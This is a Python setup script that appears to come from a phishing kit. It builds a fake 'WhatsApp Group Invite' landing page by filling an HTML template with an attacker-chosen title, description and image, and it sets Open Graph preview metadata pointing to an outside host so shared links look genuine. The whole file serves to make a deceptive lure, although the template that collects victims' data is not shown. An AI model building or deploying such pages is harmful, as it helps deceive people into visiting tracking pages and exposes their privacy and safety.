#!/usr/bin/env python3

import os
import shutil
import utils

R = '\033[31m' # red
G = '\033[32m' # green
C = '\033[36m' # cyan
W = '\033[0m'  # white

title = os.getenv('TITLE')
image = os.getenv('IMAGE')
desc = os.getenv('DESC')

if not title:
    try:
        title = input(f'{G}[+] {C}Group Title : {W}')
    except Exception:
        title = ''
if not title:
    title = 'WhatsApp Group Invite'
utils.print(f'{G}[+] {C}Group Title :{W} ' + title)

if not desc:
    try:
        desc = input(f'{G}[+] {C}Description : {W}')
    except Exception:
        desc = ''
if not desc:
    desc = 'WhatsApp Group Invite'
utils.print(f'{G}[+] {C}Description :{W} ' + desc)

if not image:
    try:
        image = input(f'{G}[+] {C}Path to Group Img (Best Size : 300x300): {W}')
    except Exception:
        image = ''
if not image:
    image = 'template/whatsapp/images/ZIvBTrQd9nP.png'
utils.print(f'{G}[+] {C}Group Image :{W} ' + image)

img_name = None
if image.startswith('http'):
    img_name = utils.downloadImageFromUrl(image, 'template/whatsapp/images/')
    if img_name:
        img_name = img_name.split('/')[-1]

if not img_name:
    img_name = image.split('/')[-1]
    dest = f'template/whatsapp/images/{img_name}'
    try:
        if os.path.exists(image) and os.path.abspath(image) != os.path.abspath(dest):
            shutil.copyfile(image, dest)
    except Exception as e:
        utils.print('\n' + R + '[-]' + C + ' Warning : ' + W + str(e))
    if not os.path.exists(dest):
        img_name = 'ZIvBTrQd9nP.png'

# Resolve absolute og_image URL for WhatsApp & Facebook scrapers
if image.startswith('http'):
    og_image = image
else:
    og_image = f'https://seeker.riocut.com/images/{img_name}'

with open('template/whatsapp/index_temp.html', 'r') as index_temp:
    code = index_temp.read()
    if os.getenv("DEBUG_HTTP"):
        code = code.replace('window.location = "https:" + restOfUrl;', '')
    code = code.replace('$TITLE$', title)
    code = code.replace('$DESC$', desc)
    code = code.replace('$OG_IMAGE$', og_image)
    code = code.replace('$IMAGE$', 'images/{}'.format(img_name))

with open('template/whatsapp/index.html', 'w') as new_index:
    new_index.write(code)